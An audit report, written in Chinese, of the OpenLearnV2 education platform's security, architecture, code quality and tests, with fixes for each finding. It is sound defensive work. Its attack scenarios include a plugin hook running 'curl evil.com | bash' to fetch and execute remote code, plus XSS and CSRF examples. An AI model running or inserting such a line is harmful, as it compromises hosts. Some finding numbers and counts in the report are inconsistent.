# OpenLearnV2 项目综合审计报告

**审计日期**：2026-09-25
**代码版本**：v0.3.22（HEAD = `2381ead`）
**审计覆盖**：1,022 个 TS/TSX 文件 / 181 个 API 路由 / 11 个迁移 / 265 个测试 / ~1,725 个 `it()` 用例
**审计维度**：🔒 安全 / 🏗 架构 / 🧹 代码质量 / 🧪 测试与可运维性（4 个并行 agent）
**审计范围**：代码库当前状态（HEAD 提交），不限于近期变更

---

## 0. 执行摘要

### 整体健康度评分（0–5）

| 维度 | 评分 | 一句话评语 |
| --- | --- | --- |
| 🔒 安全 | 2.5 / 5 | 周界防御扎实（参数化 SQL、SSRF 防护），但 CSP/HSTS/CSRF 全部缺位，插件沙箱以"进程内 inline 执行"为默认——这是最大的单点风险 |
| 🏗 架构 | 3.0 / 5 | 内核图无环、DI 单向、`plugin-sdk.d.ts` 纯净，但应用层纪律崩塌：前端 16+ 处穿透 SDK 直达 core、server 路由 50:7 绕过事件总线 |
| 🧹 代码质量 | 2.5 / 5 | 类型债务沉重（2,355 处 `any` / 328 文件），空 `catch {}` 成默认（121 处），3 个 `register*Routes` 函数合计 4,234 行 |
| 🧪 测试与运维 | 3.0 / 5 | 测试面广（265 文件）但分布不均：10/19 路由零覆盖，8 个 CI 脆弱点，`gracefulShutdown` 是已知坏掉的 no-op |

### 发现统计

- 🔴 **CRITICAL 5 项**
- 🟠 **HIGH 10 项**
- 🟡 **MEDIUM 11 项**
- ⚪ **LOW/INFO 5 项**
- 合计 **31 项**

### 一周内最高 ROI 的三个目标

1. **`server/routes/classroom.ts` 拆分**（≈1 人天）— 同时消化 HIGH-6/10、M-2、零测试覆盖等多项发现
2. **`server.ts` 安全头部三件套**（≈2 小时）— CSP + HSTS + CSRF 一次性解决 CRITICAL-1/3/4 + HIGH-1/2/3 + MEDIUM-6 共 7 项
3. **`packages/core/plugin-host/index.ts` executionMode 默认改 worker**（≈2–3 天）— 整个项目最大的安全单点

---

## 1. CRITICAL（5 项）

### 🔒 C-1：CSP 与 HSTS 完全关闭

**文件**：`server.ts:160`

**证据**：
```ts
contentSecurityPolicy: false,
strictTransportSecurity: false,
```

**问题本质**：Helmet 配置显式禁用两个最关键的安全指令。没有 CSP，任意 XSS 漏洞都能执行任意 JavaScript；没有 HSTS，HTTPS 前置时浏览器不会被强制走 HTTPS，中间人攻击可降级到 HTTP 抓 cookie。

**攻击场景**：学生上传的课件里 `onclick="fetch('/api/commands',...)"` → 老师打开课件后浏览器执行 fetch → 攻击者用老师身份执行任意已注册命令。

**修复**：显式设置 CSP 指令映射，启用 HSTS：
```ts
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "blob:"],
    frameSrc: ["'self'", "https://白名单课程源域名"],
    connectSrc: ["'self'", "wss://你的域名"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'self'"],
    upgradeInsecureRequests: [],
  },
},
hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
```

**工时**：30 分钟（须先全仓 grep `eval(` / `<script>` 清理）

---

### 🔒 C-2：插件默认"进程内 inline 执行"，拥有完整 Node 权限

**文件**：`packages/core/plugin-host/index.ts:2080, 925, 1250, 2639`

**证据**：
```ts
const executionMode = manifest.executionMode ?? 'inline';
esmLoader.load(sourceCode)  // 在宿主 Node 进程里直接跑插件 JS
```

**问题本质**：`executionMode` 默认 `'inline'`。第三方插件 JS 通过 `import()` 进入宿主进程后，享有与平台完全相同的 Node.js 权限（`fs`、`child_process`、`net` 全开）。

**攻击场景**：管理员安装一个"AI 助教"插件 → 插件代码 `module.exports = { activate: () => require('child_process').execSync('curl evil.com | bash') }` → 主机失陷。

**修复**：
```ts
const executionMode = isBuiltinPlugin(manifest)
  ? (manifest.executionMode ?? 'inline')
  : 'worker';  // 第三方插件默认 worker
```
Worker 沙箱不提供 `require`/`process`/`global`，仅通过 SDK 暴露受限 API。

**工时**：2–3 天（含 worker 模板与测试）

---

### 🔒 C-3：`unsafe-eval` 让任何插件能跑 `eval()`

**文件**：`packages/core/plugin-host/index.ts:128`

**证据**：
```ts
script-src 'self' 'unsafe-inline' 'unsafe-eval'
```

**问题本质**：`'unsafe-eval'` 是 CSP 指令的"逃生舱"，允许 `eval()`、`new Function()`、`setTimeout(string)`。**任何一处 `'unsafe-eval'` 完全抵消 CSP 防 XSS 能力**。

**与 C-1 的关系**：即便修了 C-1 启用 CSP，只要这里保留 `'unsafe-eval'`，插件内嵌的恶意脚本仍能跑。两处必须**同步**修复。

**修复**：删 `'unsafe-eval'`。`'unsafe-inline'` 看情况保留或改 nonce 模式（推荐严格模式：禁用 inline，要求所有代码在外部 `.js` 文件里）。

---

### 🔒 C-4：`/api/commands` 学生能执行任意内核命令

**文件**：`server/routes/os.ts:96`

**证据**：
```ts
app.post('/api/commands', requireAuth(), async (req, res) => {
```

**问题本质**：`requireAuth()` 无角色限定，学生可调。命令总线里大量特权命令（`lesson.create`、`whiteboard.draw`、`class.enroll_student`、`assignment.grade`、`plugin.install`）均可被学生触发。

**攻击场景**：学生 `curl -X POST /api/commands -d '{"command":"plugin.install",...}'` → 配合 C-2 触发最大爆炸半径。

**修复**（粗粒度，5 分钟）：
```ts
app.post('/api/commands', requireAuth('teacher', 'administrator'), ...);
```

**精细方案**（按命令 ACL 查表）：
```ts
const COMMAND_ACL = {
  'lesson.create': ['teacher', 'administrator'],
  'lesson.list': ['student', 'teacher', 'administrator'],
  // ... 所有 ~80 个命令
};
app.post('/api/commands', requireAuth(), (req, res) => {
  const acl = COMMAND_ACL[req.body.command];
  if (!acl) return res.status(403).json({error: 'unknown command'});
  if (!acl.includes(req.user.role)) return res.status(403).json({error: 'forbidden'});
});
```

---

### 🏗 C-5：SDK 边界被穿透 16+ 次

**文件**（部分）：
- `src/features/classroom-runtime/classroom-event-bus.ts:6` — 直接 `new EventBus()`
- `src/features/lesson-engine/{useTeachingContext,useStageRuntime,lessonEngineStore}.ts`
- `src/features/student-workspace/{student-workspace-types,student-workspace-context}.ts`
- `src/features/whiteboard/{stage-view-bridge,events/types}.ts`
- `src/components/LiveClassroomView.tsx:36`
- `src/services/event-bus.ts:11`
- `src/plugin-host/{plugin-host,service-host,browser-worker-manager,browser-worker-transport}.ts`

**问题本质**：`@openlearn/plugin-sdk` 存在的意义是给第三方插件作者稳定 API 契约。但前端在 16+ 处直接 import 了 `packages/core/*`，**等于把 SDK 门锁撬了**。

**危害**：
1. core 任何内部重构都传染 React 应用
2. 第三方插件作者抄前端代码，发现可以直接 import core → 绕过 SDK
3. 前端 bundle 拖入 server-side 工具（logger、worker-runtime）
4. 破坏"OS 内核 / 应用"分层

**修复**：

**第一步**：在 `packages/plugin-sdk/index.ts` 重导出前端需要的纯类型/接口：
```ts
export type { EventBus as IEventBus } from '../core/event-bus/types.js';
export type { LessonEngineContext } from '../core/lesson-engine/types.js';
```

**第二步**：前端写轻量 `frontend-bus` 实现 `IEventBus` 接口，替换 `classroom-event-bus.ts:6` 的 `new EventBus()`。

**第三步**：CI 加边界检查：
```bash
grep -rE "^import .* from '.*packages/core/" src/ packages/mfe-*/ 2>/dev/null && exit 1
```

**工时**：1–2 天

---

## 2. HIGH（10 项）

### 🔒 H-1：完全没有 CSRF 防护

**文件**：`server/middleware/auth.ts`（整文件）

**问题本质**：`server/middleware/auth.ts` 全文件只有 cookie 验证 + role gate，**无 CSRF token**。cookie 设置里 `sameSite: 'Lax'` 可被顶层导航绕过，部分代码 `sameSite: 'None'` 直接废掉保护。

**攻击场景**：用户登录后浏览 evil.com → evil.com `<img src="https://openlearn.example/api/...">` → 浏览器带 cookie 命中 OpenLearn → 执行越权操作。

**修复**（double-submit cookie 模式）：
```ts
// 登录时
res.cookie('csrf_token', randomToken, {
  httpOnly: false, sameSite: 'Strict', secure: true,
});

// 中间件
function csrfProtection(req, res, next) {
  if (['GET','HEAD','OPTIONS'].includes(req.method)) return next();
  if (req.cookies.csrf_token !== req.headers['x-csrf-token']) {
    return res.status(403).json({error: 'CSRF token mismatch'});
  }
  next();
}
```

**工时**：半天

---

### 🔒 H-2：`trust proxy = 1` 硬编码——cookie 安全可被 spoof

**文件**：`server.ts:144`

**证据**：
```ts
app.set('trust proxy', 1);
```

**问题本质**：如果攻击者能直接打到 Express（绕过 nginx），可伪造 `X-Forwarded-Proto: https` 让 `req.secure` 变 true，把 cookie 标 Secure 但请求实际是 HTTP。

**修复**：
```ts
app.set('trust proxy', process.env.TRUST_PROXY ?? false);
```
并把 `isSecure` 判断改为 `req.secure`（Express 自动处理 X-Forwarded-Proto）。

**工时**：10 分钟

---

### 🔒 H-3：CORS `'*'` 与 credentials 共存

**文件**：`server.ts:182`

**证据**：
```ts
const configuredOrigins = process.env.CORS_ORIGINS?.split(',') ?? ['*'];
app.use(cors({ origin: configuredOrigins, credentials: true }));
```

**问题本质**：`Access-Control-Allow-Origin: *` + `Allow-Credentials: true` 违反 CORS 规范。某些浏览器历史 bug 仍会带 cookie。开发环境常设 `*` 忘记改就上线。

**修复**：
```ts
const configuredOrigins = (process.env.CORS_ORIGINS ?? '').split(',').filter(Boolean);
app.use(cors({
  origin: (origin, cb) => {
    if (!origin) return cb(null, true);  // 同源
    if (configuredOrigins.includes(origin)) return cb(null, true);
    return cb(new Error('CORS: origin not allowed'));
  },
  credentials: true,
}));
```

**工时**：20 分钟

---

### 🔒 H-4：插件执行脚本路径无 allowlist 校验

**文件**：`packages/core/plugin-host/index.ts:2016, 2048, 2336`

**证据**：
```ts
execSync(`node "${deployScriptPath}" "${process.cwd()}"`);
```

**问题本质**：`deployScriptPath` 来自插件清单可能被攻击者控制；路径无 allowlist 校验，无 shell 注入防御。

**修复**：
```ts
const resolved = path.resolve(pluginsDir, deployScriptPath);
if (!resolved.startsWith(path.resolve(pluginsDir) + path.sep)) {
  throw new Error('Plugin deploy script path escapes plugins directory');
}
spawn('node', [resolved, process.cwd()], { stdio: 'inherit', shell: false });
```

**工时**：30 分钟

---

### 🔒 H-5：考勤接口 IDOR——学生可枚举任意班级考勤

**文件**：`server/routes/grading.ts:175`

**证据**：
```ts
app.get('/api/schedules/:scheduleId/attendance', requireAuth(), async (req, res) => {
  // 直接用 req.params.scheduleId 查考勤，无班级归属校验
});
```

**问题本质**：URL 里的 ID 无权限校验，学生暴力枚举 scheduleId 可下载所有班级学生出勤记录。

**修复**：
```ts
app.get('/api/schedules/:scheduleId/attendance',
  requireAuth('teacher', 'administrator'),
  async (req, res) => {
    const schedule = await db.prepare(
      'SELECT class_id FROM schedules WHERE id = ?'
    ).get(req.params.scheduleId);
    if (req.user.role === 'teacher' && !req.user.ownedClassIds.includes(schedule.class_id)) {
      return res.status(403).json({error: 'not your class'});
    }
    // ...
  });
```

**工时**：单点 20 分钟；全量 IDOR 审计 1–2 天

---

### 🏗 H-6：事件总线旁路 50 : 7 + 8 处双广播

**文件**：
- `server/routes/classroom.ts`（22 处直接 emit，含 8 处双广播）
- `server/presence.ts`（14 处）
- `server/routes/lessons.ts`、`server/routes/roster.ts`、`server/routes/workspace.ts` 等

**证据**（典型双广播）：
```ts
// classroom.ts:197-198
io.to(`lesson-${lessonId}`).emit('classroom-stage-changed', payload);
io.emit('classroom-stage-changed', payload);  // ← 同一个事件又发了一次
```

**问题本质**：平台有内核事件总线（`packages/core/event-bus/`），所有状态变化应走它。但 server 路由**直接对 socket.io 调 `io.emit()`** 的次数是走事件总线的 7 倍。**8 处双重广播**导致订阅者被触发两次——UI 闪烁、重复 toast、副作用双写。

**承认债务**：`server/classroom-events.ts:6-9` 头部注释自承"REST 路由里直接 `io.emit(...)`，绕过了内核事件总线"。

**修复**：走内核事件总线：
```ts
// 旧
io.to(`lesson-${lessonId}`).emit('classroom-stage-changed', payload);
io.emit('classroom-stage-changed', payload);

// 新
await kernel.eventBus.publish('classroom.stage_changed', {
  lessonId, payload, actorId: req.user.id,
});
// event-routing.ts 监听后自动路由到对应房间
```

**工时**：2–3 天（要批量改 ~50 处 + 完善 event-routing.ts 事件映射）

---

### 🏗 H-7：内核依赖应用层 logger（依赖倒置）

**文件**：
- `packages/core/plugin-host/context-builder.ts:25`
- `packages/core/worker-runtime/worker-manager.ts:42`

**证据**：
```ts
import { createLogger } from '../../../server/utils/logger.js';
```

**问题本质**：依赖方向应该是 `app → kernel`（应用依赖内核），**永远不是反过来**。但 `packages/core/*`（内核）依赖 `server/utils/logger.js`（应用层工具）。测试隔离失败，未来重构锁死。

**修复**：把 logger 移到 `packages/core/observability/logger.ts`，`server/utils/logger.ts` 改为 re-export。

**工时**：半天

---

### 🧪 H-8：`gracefulShutdown` 是已知坏掉的 no-op

**文件**：`server.ts:562-585`

**证据**：
```ts
async function gracefulShutdown(signal: string) {
  if (shuttingDown) return;
  shuttingDown = true;
  setTimeout(() => { console.error('Forced shutdown'); process.exit(1); }, 30000);
  try {
    // 注意：这些操作在模块作用域无法直接访问 Express 和 httpServer
    console.log('[Server] Shutting down...');
    process.exit(0);  // ← 5ms 内立即退出，30s 超时机制是死的
  } catch (e) { process.exit(1); }
}
```

**问题本质**：注释自己承认无法访问 `httpServer`/`io`。SIGTERM 触发后 5ms 内 `process.exit(0)`，**30s 超时机制根本用不上**。进行中 HTTP 请求被切断、Socket.IO 客户端瞬间断开、SQLite WAL 未刷盘——最近一次写入可能丢失。

**修复**：让 `startServer()` 返回 cleanup 函数：
```ts
export async function startServer() {
  // ... 启动逻辑 ...
  return {
    app, httpServer, io, db,
    cleanup: async () => {
      await new Promise<void>((resolve) => httpServer.close(() => resolve()));
      io.close();
      dbHandle.close();
    },
  };
}

const server = await startServer();
process.on('SIGTERM', async () => {
  const timeout = setTimeout(() => process.exit(1), 30000);
  try { await server.cleanup(); clearTimeout(timeout); process.exit(0); }
  catch (e) { process.exit(1); }
});
```

**工时**：45 分钟

---

### 🧪 H-9：CI flake 重灾区——8 处墙钟 `setTimeout` 等待 worker 写库

**文件**：`packages/core/__tests__/worker-rpc.test.ts:114,189,295,460,480,500,520`

**证据**：
```ts
await new Promise((resolve) => setTimeout(resolve, 1500));
// ...
await new Promise((resolve) => setTimeout(resolve, 5500));
```

**问题本质**：测试在测"主进程 → Worker → 写 SQLite → 主进程查"。固定时长等待在本地开发机绰绰有余，GitHub Actions runner（2 vCPU + 慢 IO）worker 启动可能 800ms+ 写库 800ms，1500ms 不够。

**修复**：用 `vi.waitFor` 轮询确定性信号：
```ts
await vi.waitFor(
  () => db.prepare('SELECT * FROM x WHERE id = ?').get(id),
  { timeout: 5000, interval: 50 }
);
```

**同类反模式**：`packages/core/__tests__/plugin-http-streaming.test.ts:369, 411, 457, 464, 718` 5 处。

**工时**：45 分钟

---

### 🧹 H-10：8 个 `register*Routes` 单函数合计 4,234 行

**文件**：

| 文件 | 函数 | 行数 |
| --- | --- | --- |
| `server/routes/classroom.ts:89` | `registerClassroomRoutes` | 1,710 |
| `server/routes/roster.ts:13` | `registerRosterRoutes` | 1,620 |
| `server/routes/lessons.ts:163` | `registerLessonsRoutes` | 904 |
| `server/routes/grading.ts` | `registerGradingRoutes` | 806 |
| `server/routes/plugins.ts` | `registerPluginsRoutes` | 797 |
| `packages/core/worker-runtime/worker-manager.ts:381` | `generateBootstrapCode` | 753 |
| `src/components/CourseWizardModal.tsx` | — | 735 |
| `server/routes/courseware.ts` | `registerCoursewareRoutes` | 707 |

**问题本质**：
1. 单一文件承担太多职责（classroom.ts 揉 10 个 feature）
2. 测试写不下去（要 mock 整个 Express + SQLite）
3. `requireAuth('teacher','administrator')` 重复 74 次、`requireAuth('administrator')` 重复 31 次
4. `any` 与空 catch 集中地（classroom.ts 76 个 `any`、10 个空 catch）

**修复**：用 Express Router 拆分子路由：
```ts
// server/routes/classroom/live.ts
export const liveRouter = express.Router();
liveRouter.get('/sessions', requireAuth('teacher','administrator'), listSessions);

// server/routes/classroom/index.ts
import { liveRouter } from './live';
import { aiCopilotRouter } from './ai-copilot';

export function registerClassroomRoutes(app, deps) {
  app.use('/api/classroom', liveRouter);
  app.use('/api/classroom/ai', aiCopilotRouter);
}
```

**工时**：1–2 天

---

## 3. MEDIUM（11 项）

### 🧹 M-1：动态表名 SQL——模式安全但脆弱

**文件**：
- `packages/core/plugin-host/index.ts:1809` — `db.exec(\`DROP TABLE IF EXISTS ${t.name}\`)`
- `server/routes/roster.ts:206` — `db.prepare(\`SELECT count(*) FROM ${t.name}\`)`

**修复**：在最底层（执行点）做白名单校验：
```ts
if (!/^[A-Za-z0-9_]+$/.test(t.name)) {
  throw new Error(`Refusing unsafe table name: ${t.name}`);
}
```

**工时**：20 分钟

---

### 🔒 M-2：12 个路由文件至少一个 handler 裸 `requireAuth()`

**文件**：`server/routes/{plugins,os,roster,lessons,courseware,classroom,...}.ts`（12 个文件）

**问题本质**：H-5 是已发现的具体 IDOR；M-2 是未发现的潜在 IDOR 池。所有写操作（POST/PUT/DELETE）用裸 `requireAuth()` 几乎一定有问题。

**修复**：
- 第一阶段：列出所有"裸 requireAuth 的写操作"，逐个加角色（半天）
- 第二阶段：写 ESLint rule 自动报警（半天）

**工时**：1–2 天

---

### 🏗 M-3：`plugin-sdk/index.ts` 重导出 core 运行时类——SDK 不可独立发包

**文件**：`packages/plugin-sdk/index.ts:37, 61, 92, 97, 173, 311-316`

**证据**：
```ts
// plugin-sdk/index.ts 头部注释声称"No re-exports from monorepo internals"
export { ... } from '../core/plugin-host/http-router.js';       // L37 运行时类
export { ... } from '../core/plugin-host/config-service.js';   // L61
export { ... } from '../core/esm-loader/manifest-schema.js';   // L92
export { Token } from '../core/di/token.js';                    // L97 运行时类
export { ... } from '../core/ai-capability/registry/capability-registry.js'; // L173
```

**问题本质**：`openlearn.d.ts` 纯净但 `index.ts` 不纯净。SDK 不能独立发包到 npm——任何外部插件作者 `npm install @openlearn/plugin-sdk` 时会自动拖入 core 一大堆运行时依赖。

**修复**：把 core 的运行时类移到 SDK 内部，core 反过来 import SDK。

**工时**：1 天

---

### 🏗 M-4：3 个 composition module 创建并行 DI 图

**文件**：
- `packages/core/bootstrap/composition/ai-composition-module.ts:17-18`
- `packages/core/bootstrap/composition/plugin-composition-module.ts:23,57`
- `packages/core/bootstrap/composition/whiteboard-composition-module.ts:19,21`

**证据**：每个文件都 `new PlatformServiceRegistry()` + `new EventBus()`，与 `kernelContainer` 并行存在。`kernelContainer` 看不到这些插件，但前端可能通过 composition module 直接拿到插件实例——审计、生命周期、依赖图全部破碎。

**承认债务**：`whiteboard-composition-module.ts:15` 注释自承"原实现在 compose() 内 `new PlatformServiceRegistry()`——已知 issue"。

**修复**：要么删掉这 3 个 module；要么改为 `kernelContainer` 的 facade。

**工时**：半天（评估）+ 1 天（迁移）

---

### 🧹 M-5：iframe 沙箱 shim 16 个空 `catch`——安全回归被静默

**文件**：`server/utils/bridge-sdk.ts`（L22, 37, 80, 98, 126, 154, 162, 185, 201...）

**证据**：
```ts
try { ... } catch (_) {}     // 静默吞错，共 16 处
```

**问题本质**：`bridge-sdk.ts` 是项目最敏感的 shim 之一（`Object.defineProperty` + `Proxy` 拦截 `postMessage`、targetOrigin 标准化、注入受信消息）。空 catch 让沙箱违反无法被检测、攻击者注入畸形消息时静默失败、安全回归无 CI 信号。

**修复**：
```ts
try { ... } catch (err) {
  logger.warn('[bridge-sdk] postMessage normalization failed', {
    err, origin: event.origin, source: typeof event.source,
  });
}
```

**工时**：30 分钟

---

### 🧹 M-6：`server.ts` 启动期 4 个空 catch

**文件**：`server.ts:252, 262, 476, 495`

**修复**：统一用 `pino` logger，启动期失败显式 `process.exit(1)` 不要静默继续。

**工时**：15 分钟

---

### 🧹 M-7：`generateBootstrapCode` 单函数 753 行——插件加载器高风险区

**文件**：`packages/core/worker-runtime/worker-manager.ts:381`

**问题本质**：负责生成每个 Worker 启动时跑的 bootstrap 代码（注入 SDK API、设置 require 拦截、注册 IPC handlers、配置日志）。任何拼写错误 = 所有插件加载失败；字符串拼接容易引入注入；测试困难；接手的人需要花一整天读完。

**修复**：拆分为多个模板片段（`generateImports`、`generateSandboxSetup`、`generateIpcHandlers` 等），每个独立单元测试。

**工时**：半天拆分 + 半天测试

---

### 🧹 M-8：UI 组件 25 个空 catch——倒计时、定时器冻结无诊断

**文件**：
| 文件 | 空 catch 数 |
| --- | --- |
| `src/App.tsx` | 11 |
| `src/features/classroom/ClassroomCountdownWidget.tsx` | 10 |
| `src/features/student/StudentCountdownBanner.tsx` | 4 |

**问题本质**：UI 空 catch 比 server 端更讨厌——用户看到"倒计时停了 10 分钟"以为系统死了；没有 console.error 开发者本地复现不出来；React DevTools 看不到问题。

**修复**：catch 里 `setError('时间同步失败')` + `logger.warn`，UI 上渲染错误状态。

**工时**：1 小时

---

### 🧹 M-9：前端 + 测试共 ~190 个 `any` 集中在 5 个文件

| 文件 | any 数 |
| --- | --- |
| `server/routes/roster.ts` | 81 |
| `server/routes/classroom.ts` | 76 |
| `packages/plugins/builtin.ts` | 68 |
| `packages/core/worker-runtime/__tests__/service-host.test.ts` | 66 |
| `packages/plugins/__tests__/assignment-eval.test.ts` | 58 |
| `src/features/teacher/classes/ClassAssignmentsPanel.tsx` | 45 |

**问题本质**：测试文件的高 any 特别值得警惕——测试期待 any 形状、实现代码配合 any 形状、生产代码 review 时大家默认"反正测试这么写的"。

**修复**（按 ROI 排序）：
1. `ClassAssignmentsPanel.tsx`（前端用户可见）— 1 天
2. `builtin.ts`（被插件作者抄）— 1 天
3. 测试 any fixture——只改新增/改动的测试（持续）

ESLint 加严：`@typescript-eslint/no-explicit-any: warn` + `no-unsafe-assignment: warn` + `no-unsafe-member-access: warn`。

**工时**：持续进行

---

### 🧪 M-10：10 个迁移 SQL 全部无 `-- DOWN` 块

**文件**：
```
migrations/000_initial_schema.sql
migrations/001_add_execution_mode.sql
migrations/002_add_client_session_expiry.sql
migrations/003_classroom_runtime.sql
migrations/004_courseware_score_config.sql
migrations/005_assignment_hub.sql
migrations/006_classroom_event_bus.sql
migrations/007_interactive_classroom.sql
migrations/008_teaching_modes.sql
migrations/009_classroom_peer_review.sql
```

**证据**：`server/utils/migrate.ts:119-121`：
```ts
if (!migration.downSql) {
  throw new Error(`Migration ${id} does not provide a DOWN rollback script.`);
}
```

**问题本质**：rollback 函数永远抛错。DBA 想回滚只能 `git checkout HEAD~N -- migrations/NNN_*.sql` + 手工 SQL。`migrate.test.ts` 用合成 SQL（自带 DOWN），**不测试真实迁移文件**。

**修复**：为每个迁移加 DOWN 块（模式机械：CREATE TABLE 配 DROP TABLE IF EXISTS，ALTER TABLE 加列配 DROP COLUMN）。注意 DOWN 必须反向执行。

**工时**：30 分钟

---

### 🧪 M-11：`MockCapability(initialCaps)` 构造体空——cap 测试全假阳性

**文件**：`packages/plugin-test-kit/index.ts`（~190 行附近）

**证据**：
```ts
class MockCapability {
  constructor(initialCaps?: string[]) {
    if (initialCaps && initialCaps.length > 0) {
      // ← 空体！initialCaps 被静默丢弃
    }
  }
}
```

**问题本质**：测试 `createMockContext({ capabilities: ['lesson:read'] })` 期望授权成功，实际 `cap.check()` 返回 false。**单元测试和集成测试不一致**——开发者不再信任测试套件。插件作者基于"假阳性绿勾"开发，发布后生产环境权限拒绝。

**修复**：
```ts
class MockCapability {
  private grants = new Map<string, Set<string>>();
  constructor(initialCaps?: string[]) {
    if (initialCaps?.length) {
      for (const cap of initialCaps) this.grant('actor-default', cap);
    }
  }
  grant(actorId: string, capability: string) {
    if (!this.grants.has(actorId)) this.grants.set(actorId, new Set());
    this.grants.get(actorId)!.add(capability);
  }
  check(actorId: string, capability: string): boolean {
    return this.grants.get(actorId)?.has(capability) ?? false;
  }
}
```

**工时**：10 分钟

---

## 4. LOW / INFO（5 项）

### 🔒 L-1：`__Host-` cookie 前缀缺失

**文件**：`server/routes/plugin-api-gateway.ts:445, 657`、`server/routes/roster.ts:657`

**问题**：cookie 用 `Path=/`，未用 `__Host-` 前缀（要求 Secure + Path=/ + 无 Domain 属性），抗 subdomain 劫持能力弱。

**修复**：切换到 `__Host-edu_os_token; Path=/; Secure`。

**工时**：10 分钟

---

### 🔒 L-2：session 生命周期 7 天过长

**文件**：`server/middleware/auth.ts`（注释说明）

**修复**：考虑 refresh-token rotation 或更短 idle timeout（当前 24h idle）。

---

### 🔒 L-3：`url-safety.ts` 无 DNS rebinding 防御

**文件**：`server/utils/url-safety.ts`

**问题**：`isSafeExternalUrl` 仅主机名字面匹配，无 DNS 解析后 IP 校验。攻击者可注册域名 `evil.com` → DNS A 记录指向 `127.0.0.1` → 通过 SSRF 攻击本地服务。

**修复**：fetch 前 `dns.lookup(host)` 校验 IP 不在 loopback/private 范围（与 SSRF 防护复用同一 helper）。

---

### 🧪 L-2：`lti-provider-plugin.test.ts` 被配置排除但仍提交

**文件**：`packages/core/__tests__/lti-provider-plugin.test.ts`、`vitest.config.ts:48`

**问题**：CI lint 该文件但从不跑——dead code 在 repo 里。

**修复**：要么删文件，要么取消排除配置。

---

### 🏗 L-3：`packages/plugin-sdk/openlearn.d.ts` 完全纯净（已验证 ✅）

**证据**：0 处从 concrete 包导入。问题只在 `index.ts` 的 8 处重导出（M-3）。

---

## 5. 测试覆盖地图

### 5.1 测试空白热点（按风险排序）

| 模块 | .ts 文件数 | 风险 | 原因 |
| --- | --- | --- | --- |
| `packages/core/ai-capability/` | 12 | 🔴 HIGH | AI 工具调用安全边界 |
| `packages/core/ai/` | 11 | 🔴 HIGH | AI provider/运行时抽象 |
| `packages/core/collaboration-engine/` | 15 | 🔴 HIGH | 实时多人协作 |
| `packages/core/presence-engine/` | 13 | 🔴 HIGH | 在线状态：错误 = 出现"幽灵学生" |
| `packages/core/{configuration,analytics-engine,service-registry,capability}/` | 13×4 | 🟡 MEDIUM | 配置/遥测/DI/cap 授权 |

### 5.2 未覆盖路由文件（10/19 路由文件零测试）

| 路由文件 | LOC | `app.{verb}` 数 | 风险 |
| --- | --- | --- | --- |
| `server/routes/roster.ts` | 1,632 | 44 | 🔴 CRITICAL（班级花名册 = 几乎所有端点的认证基础） |
| `server/routes/lessons.ts` | 1,066 | 23 | 🔴 HIGH |
| `server/routes/grading.ts` | 817 | 16 | 🔴 HIGH（含 H-5 IDOR） |
| `server/routes/assignments.ts` | — | 7 | 🔴 HIGH |
| `server/routes/admin.ts` | 240 | 6 | 🔴 HIGH（admin 弱覆盖 = 提权面） |
| `server/routes/processes.ts` | — | 5 | 🟡 MEDIUM |
| `server/routes/resources.ts` | — | 5 | 🟡 MEDIUM |
| `server/routes/workspace.ts` | — | 5 | 🟡 MEDIUM |
| `server/routes/plugin-api-gateway.ts` | — | — | 🟡 MEDIUM（公共插件入口） |
| `server/routes/plugins.ts` | — | — | 🟡 MEDIUM（插件管理） |

### 5.3 已验证的非问题

- ✅ React Hooks 卫生**干净**——前 3 大 tsx 文件 70+ 个 `useEffect`/`useCallback`/`useMemo`，零空依赖数组、零 `eslint-disable`、零缺失 `key=`
- ✅ `@ts-ignore` 全仓**只有 2 处**，`@ts-expect-error` 为 0
- ✅ 测试结构质量高：0 个 `expect(true)` 烟雾、0 个 `test()` 单调用、0 个 `*.snap` 快照、全部用 `describe()`
- ✅ `GlobalErrorBoundary` 已挂在根；插件扩展点有第二道 ErrorBoundary
- ✅ `/health`、`/health/ready`、`/metrics` 健康检查端点齐全

---

## 6. 跨维度共性问题（最高 ROI 修复目标）

| 文件 | 安全 | 架构 | 质量 | 测试 | 共识 |
| --- | --- | --- | --- | --- | --- |
| **`server/routes/classroom.ts`**（1798 行） | H-5 邻接 | H-6 22 处直接 emit / 8 双广播 | C 级（76 `any`、10 空 catch、1710 行单函数） | 10/19 路由零覆盖名单 | **4 个维度全中招** |
| **`packages/core/plugin-host/index.ts`**（2823 行） | C-2、C-3、H-4、M-1 | C-5（被前端穿透）、H-7（依赖倒置） | M-7（worker bootstrap 753 行） | — | **3 个维度全中招** |
| **`server.ts`**（584 行） | C-1、H-2、H-3 | — | M-6 | H-8（gracefulShutdown） | **3 个维度全中招** |

---

## 7. 快速修复清单（≤ 1 小时/项）

按 ROI 排序：

1. **🔒 启用 CSP + HSTS**（30 min）— `server.ts:160` 改成显式指令映射
2. **🧪 修 `MockCapability` 构造体**（10 min）— 让所有插件 cap 测试重新可信
3. **🔒 给 `/api/commands` 加角色**（5 min）— `requireAuth()` → `requireAuth('teacher','administrator')`
4. **🧹 给 `server.ts` 的空 catch 加 `console.error`**（15 min）— 至少 4 处启动期错误对运维可见
5. **🧪 补 `migrations/*.sql` 的 `-- DOWN` 块**（30 min）— 现有 `ALTER TABLE` 都可逆
6. **🔒 `classroom.ts` 修 IDOR**（20 min）— 在 `grading.ts:175` 加 `req.user.classIds.includes(...)` 过滤
7. **🧹 提取 `requireTeacher` / `requireAdmin` 中间件**（30 min）— 一举消除 74 + 31 处重复
8. **🧪 重写 `worker-rpc.test.ts` 的 8 处 `setTimeout`**（45 min）— 改 `vi.waitFor` 触发确定性信号
9. **🔧 `gracefulShutdown` 改成消费 `cleanup` 函数**（45 min）— `startServer()` 已存在
10. **🧪 复制 `classroom-routes-contract.test.ts` 模板到 5 个空缺路由**（1 h）— 恢复 5 个最高风险路由的覆盖

---

## 8. 修复路线图（建议）

### Sprint 1（本周，1 人天）：单文件最低成本三件套
- C-1 + C-3：CSP + HSTS + unsafe-eval 修复（`server.ts:160` + `plugin-host/index.ts:128`）
- C-4：`/api/commands` 加角色（`server/routes/os.ts:96`）
- H-2 + H-3：`trust proxy` + CORS 配置（`server.ts`）
- H-8：`gracefulShutdown` 修复（`server.ts:562-585`）
- M-6：启动期空 catch（`server.ts`）

**全在 `server.ts`**——单一 PR、单一文件、立即生效。

